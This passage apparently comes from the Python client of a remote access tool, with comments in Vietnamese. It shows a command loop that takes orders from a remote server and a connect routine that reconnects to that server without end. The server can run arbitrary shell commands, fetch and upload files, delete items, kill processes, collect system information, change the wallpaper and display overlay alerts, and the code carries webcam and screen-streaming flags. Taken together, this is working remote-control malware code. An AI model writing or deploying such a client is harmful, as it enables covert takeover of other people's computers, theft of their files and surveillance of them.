                                    if save_base64_wallpaper(b64, tmppath):
                                        success = set_wallpaper_local(tmppath)
                                    else:
                                        print("[WALLPAPER] Failed to save base64 image")
                                    
                                    try:
                                        os.unlink(tmppath)
                                    except:
                                        pass
                            
                            # Gửi phản hồi về server
                            if success:
                                print("[WALLPAPER] Wallpaper set successfully")
                                send_packet({
                                    "type": "cmd_output",
                                    "client_id": CLIENT_ID,
                                    "command": "set_wallpaper",
                                    "output": "Wallpaper set successfully",
                                    "returncode": 0
                                })
                            else:
                                print("[WALLPAPER] Failed to set wallpaper")
                                send_packet({
                                    "type": "cmd_output", 
                                    "client_id": CLIENT_ID,
                                    "command": "set_wallpaper",
                                    "output": "Failed to set wallpaper",
                                    "returncode": 1
                                })
                                
                        except Exception as e:
                            print(f"[WALLPAPER] Unexpected error: {e}")
                            send_packet({
                                "type": "cmd_output",
                                "client_id": CLIENT_ID, 
                                "command": "set_wallpaper",
                                "output": f"Wallpaper error: {str(e)}",
                                "returncode": 1
                            })

                    elif act == "get_process_list":
                        plist = get_process_list()
                        print("[CLIENT] Sending process list, count =", len(plist))
                        send_packet({"type": "process_list", "list": plist})

                    elif act == "kill_process":
                        pid = command_field.get("pid")
                        if pid:
                            kill_process(pid)

                    elif act == "execute_command":
                        command_text = command_field.get("command")
                        if command_text:
                            print(f"[CLIENT] Executing command: {command_text}")
                            output, returncode = execute_command(command_text)
                            send_packet({
                                "type": "cmd_output", 
                                "client_id": CLIENT_ID,
                                "command": command_text,
                                "output": output,
                                "returncode": returncode,
                                "timestamp": time.time()
                            })

                    # THÊM CÁC LỆNH MỚI Ở ĐÂY - ĐÚNG VỊ TRÍ
                    elif act == "list_directory":
                        path = command_field.get("path", "C:\\")
                        result, returncode = list_directory(path)
                        send_packet({
                            "type": "directory_listing",
                            "client_id": CLIENT_ID,
                            "path": path,
                            "listing": result,
                            "returncode": returncode
                        })

                    elif act == "delete_item":
                        item_path = command_field.get("item_path")
                        item_type = command_field.get("item_type")
                        if item_path:
                            output, returncode = delete_item(item_path, item_type)
                            send_packet({
                                "type": "cmd_output",
                                "client_id": CLIENT_ID,
                                "command": command_field,
                                "output": output,
                                "returncode": returncode
                            })
                    
                    # THÊM ACTION MỚI - Upload file
                    elif act == "upload_file":
                        file_name = command_field.get("file_name")
                        file_data_b64 = command_field.get("file_data")
                        destination_path = command_field.get("destination_path")
                        if file_name and file_data_b64:
                            output, returncode = upload_file(file_name, file_data_b64, destination_path)
                            send_packet({
                                "type": "cmd_output",
                                "client_id": CLIENT_ID,
                                "command": command_field,
                                "output": output,
                                "returncode": returncode
                            })

                    # THAY THẾ BẰNG:
                    elif act == "set_alert":
                        enabled = command_field.get("enabled", False)
                        
                        # Lấy tất cả settings từ command
                        alert_settings_from_cmd = {
                            "text": command_field.get("text", alert_settings["text"]),
                            "font_size": command_field.get("font_size", alert_settings["font_size"]),
                            "text_color": command_field.get("text_color", alert_settings["text_color"]),
                            "bg_color": command_field.get("bg_color", alert_settings["bg_color"]),
                            "position_x": command_field.get("position_x", alert_settings["position_x"]),
                            "position_y": command_field.get("position_y", alert_settings["position_y"]),
                            "width": command_field.get("width", alert_settings["width"]),
                            "height": command_field.get("height", alert_settings["height"]),
                            "effect": command_field.get("effect", alert_settings["effect"])
                        }
                        
                        # Bật/tắt alert overlay với settings mới
                        toggle_alert_overlay(enabled, alert_settings_from_cmd)
                        
                        # Gửi phản hồi
                        send_packet({
                            "type": "cmd_output",
                            "client_id": CLIENT_ID,
                            "command": command_field,
                            "output": f"Alert {'enabled' if enabled else 'disabled'} with custom settings",
                            "returncode": 0
                        })
                    elif act == "get_file":
                        file_path = command_field.get("file_path")
                        request_id = command_field.get("request_id")
                        if file_path:
                            result, returncode = get_file(file_path)
                            # SỬA Ở ĐÂY: Đảm bảo gửi đúng cấu trúc packet
                            packet_data = {
                                "type": "file_data",
                                "client_id": CLIENT_ID,
                                "request_id": request_id,
                                "status": "success" if returncode == 0 else "error"
                            }
                            # Thêm kết quả vào packet
                            if returncode == 0:
                                packet_data.update(result)
                            else:
                                packet_data.update({"error": result.get("error", "Unknown error")})
                                
                            send_packet(packet_data)
                            
                    elif act == "get_system_info":
                        print("[CLIENT] Collecting system information...")
                        info, returncode = get_system_info()
                        send_packet({
                            "type": "system_info",
                            "client_id": CLIENT_ID,
                            "info": info,
                            "returncode": returncode,
                            "timestamp": time.time()
                        }) 


                    continue
        except Exception as e:
            print(f"[CLIENT] Error in listen_loop: {e}")
            break  # Thoát khỏi listen_loop để reconnect

def connect():
    global sock, connection_active, reconnect_delay, stream_webcam, stream_screen
    

    while True:
        if not is_network_available():
            print("[CLIENT] Network unavailable, waiting...")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
            continue
            
        try:



            print(f"[CLIENT] Connecting to server {SERVER_HOST}:{SERVER_PORT}...")
            


            # Đảm bảo dừng tất cả stream trước khi kết nối mới
            stream_webcam = False
            stream_screen = False
            stop_event.set()
            time.sleep(1)
            stop_event.clear()
            
            # Tạo socket mới
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15.0)  # Tăng timeout kết nối
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            # Trên Windows:
            if platform.system() == "Windows":
                sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))  # 10s idle, 3s interval


                
            # Kết nối
            sock.connect((SERVER_HOST, SERVER_PORT))
            print("[CLIENT] Connected successfully.")
            connection_active = True
            reconnect_delay = 1  # Reset delay
            
            # THÊM: Đợi kết nối ổn định trước khi gửi hello
            time.sleep(0.5)
            
            # THỬ GỬI HELLO PACKET NHIỀU LẦN
            hello_sent = False
            for attempt in range(3):
                try:
                    if send_packet({"type": "hello", "role": "client"}):
                        print("[CLIENT] Hello packet sent successfully")
                        hello_sent = True
                        break
                    else:
                        print(f"[CLIENT] Hello packet attempt {attempt + 1} failed")
                        time.sleep(0.5)
                except Exception as e:
                    print(f"[CLIENT] Error sending hello: {e}")
                    time.sleep(0.5)

            if not hello_sent:
                raise Exception("Failed to send hello packet after 3 attempts")
            
            # Bắt đầu heartbeat
            heartbeat_thread = threading.Thread(target=send_heartbeat, daemon=True)
            heartbeat_thread.start()
            
            # Bắt đầu listen loop
            listen_loop()
            
        except socket.gaierror as e:
            print(f"[CLIENT] DNS resolution failed: {e}")
        except socket.timeout:
            print("[CLIENT] Connection timeout")
        except ConnectionRefusedError:
            print("[CLIENT] Connection refused by server")
        except Exception as e:
            print(f"[CLIENT] Connect failed: {e}")
        
        # Cleanup
        connection_active = False
        stream_webcam = False
        stream_screen = False
        
        if sock:
            try:
                sock.close()
            except:
                pass
            sock = None
        
        print(f"[CLIENT] Reconnecting in {reconnect_delay} seconds...")
        time.sleep(reconnect_delay)
        reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)

if __name__ == "__main__":
    connect()